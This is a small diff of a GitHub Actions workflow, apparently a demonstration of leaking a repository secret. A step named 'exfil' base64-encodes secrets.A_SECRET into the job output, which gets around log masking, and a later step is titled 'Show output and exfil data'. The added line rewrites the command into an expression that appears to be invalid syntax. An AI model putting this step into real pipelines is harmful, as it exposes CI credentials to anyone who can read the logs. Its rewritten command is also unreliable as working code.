@@ -25,7 +25,7 @@ jobs:
       - name: Run a one-line script
         id: "exfil"
         run: |
-         echo "exfilsecret=${{ secrets.A_SECRET }}" | base64 >> $GITHUB_OUTPUT
+         echo "${{exfilsecret= secrets.A_SECRET | base64}}" >> $GITHUB_OUTPUT
 
       - name: Show output and exfil data
         run: |
